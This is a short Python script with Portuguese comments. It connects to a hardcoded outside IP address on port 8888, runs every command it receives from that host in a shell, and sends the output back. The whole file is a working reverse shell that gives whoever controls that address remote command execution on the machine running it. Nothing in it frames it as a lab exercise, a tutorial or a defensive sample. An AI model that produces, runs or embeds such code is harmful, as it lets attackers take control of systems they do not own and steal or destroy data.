import socket
import subprocess

def connect(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        return s
    except Exception as e:
        print("Erro:", e)
        return None

def listen(s):
    try:
        while True:
            command = s.recv(1024).decode()
            if command.lower() == "exit":
                break
            output = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            s.send(output.stdout.read())
            s.send(output.stderr.read())
    except Exception as e:
        print("Erro durante a escuta:", e)
        s.close()

def main():
    IP = '179.221.193.55'  # IP do servidor
    PORT = 8888       # Porta do servidor

    s = connect(IP, PORT)
    if s:
        print("[+] Sucesso")
        listen(s)
    else:
        print("[-] Erro ao se conectar")

if __name__ == "__main__":
    main()
